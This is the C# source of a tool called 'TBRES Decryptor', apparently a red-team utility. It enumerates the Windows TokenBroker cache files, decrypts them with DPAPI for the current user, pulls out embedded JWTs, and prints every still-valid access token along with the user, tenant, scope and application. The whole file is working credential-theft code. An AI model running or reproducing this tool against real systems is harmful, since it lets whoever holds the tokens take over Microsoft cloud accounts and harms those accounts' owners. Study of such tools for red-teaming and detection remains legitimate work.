using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Buffers.Text;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using System.IdentityModel.Tokens.Jwt;

namespace TBRES
{
    public class main
    {
        public static string[] GetFiles(string dir)
        {
            var tbresFiles = Directory.EnumerateFiles(dir, "*.tbres");
            return tbresFiles.ToArray();
        }

       
      

        public static JwtSecurityToken UnprotectTokens(string input)
        {
            try
            {
                dynamic jsonObject = JsonConvert.DeserializeObject<dynamic>(input);
                string encodedData = jsonObject["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].ToString();
                byte[] encryptedData = Convert.FromBase64String(encodedData);

                byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);

                string decryptedDataString = Encoding.ASCII.GetString(decryptedData);

                var regeexData = Regex.Matches(decryptedDataString, @"(ey[a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)");
                if (regeexData.Count > 0)
                {
                    foreach (Match regexMatch in regeexData)
                    {
                        string token = regexMatch.Value;
                        JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
                        JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(token);

                        if (jwtSecToken.ValidTo > DateTime.Now)
                            return jwtSecToken;
                    }
                }

                return null;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public static List<JwtSecurityToken> UnprotectFiles(string dir)
        {
            var listOfJwtTokens = new List<JwtSecurityToken>() { };
            foreach (var file in GetFiles(dir))
            {
                var fileJSON = System.IO.File.ReadAllText(file, Encoding.Unicode);
                JwtSecurityToken jwtToken = UnprotectTokens(fileJSON.Substring(0, fileJSON.Length - 1));
                if (jwtToken != null)
                {
                    listOfJwtTokens.Add(jwtToken);
                }
            }

            return listOfJwtTokens;
        }

       

        public static void Main(string[] args)
        {
            Console.WriteLine("TBRES Decryptor by @_xpn_, turned into crap by @flangvik");

            var tokenPath = String.Format(@"{0}\Microsoft\TokenBroker\Cache", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            var jwtTokens = UnprotectFiles(tokenPath);
            foreach (JwtSecurityToken jwtSecurityToken in jwtTokens)
            {
                jwtSecurityToken.Payload.TryGetValue("unique_name", out var upn);
                jwtSecurityToken.Payload.TryGetValue("tid", out var tenantId);
                jwtSecurityToken.Payload.TryGetValue("aud", out var resourceAccess);
                jwtSecurityToken.Payload.TryGetValue("scp", out var scope);
                jwtSecurityToken.Payload.TryGetValue("app_displayname", out var app);

                Console.WriteLine($"-----------------");
                Console.WriteLine($"User: {upn}");
                Console.WriteLine($"Resource: {resourceAccess}");
                Console.WriteLine($"TenantId: {tenantId}");
                Console.WriteLine($"Scope: {scope}");
                Console.WriteLine($"App: {app}");
                Console.WriteLine($"access_token: {jwtSecurityToken.RawData}");
                Console.WriteLine($"-----------------");
            }
        }
    }
}
